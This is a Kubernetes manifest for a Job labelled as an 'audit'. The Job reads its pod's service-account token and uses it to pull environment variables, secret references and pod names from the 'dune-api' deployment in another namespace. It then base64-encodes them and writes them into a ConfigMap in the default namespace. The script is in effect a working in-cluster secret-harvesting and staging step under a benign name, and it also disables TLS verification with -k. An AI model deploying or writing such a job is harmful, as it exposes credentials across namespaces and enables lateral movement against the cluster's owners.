apiVersion: v1
kind: ConfigMap
metadata:
  name: dune-audit-result3
  namespace: default
data:
  status: pending
---
apiVersion: batch/v1
kind: Job
metadata:
  name: dune-audit-v3
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q jq
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          KUBE_NS="dune-api"
          
          # Get only env vars from dune-api containers
          ENVVARS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/apis/apps/v1/namespaces/$KUBE_NS/deployments/dune-api" | \
            jq -c '.spec.template.spec.containers[].env' | base64 -w0)
          
          # Get envFrom (secret refs)
          ENVFROM=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/apis/apps/v1/namespaces/$KUBE_NS/deployments/dune-api" | \
            jq -c '.spec.template.spec.containers[].envFrom' | base64 -w0)
          
          # Try to also get pods
          PODNAMES=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/$KUBE_NS/pods" | jq -r '.items[].metadata.name' | base64 -w0)
          
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" -H "Content-Type: application/json" \
            -X PUT "$API/api/v1/namespaces/default/configmaps/dune-audit-result3" \
            --data-binary "{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"dune-audit-result3\",\"namespace\":\"default\"},\"data\":{\"envvars\":\"$ENVVARS\",\"envfrom\":\"$ENVFROM\",\"pods\":\"$PODNAMES\"}}"
          echo DONE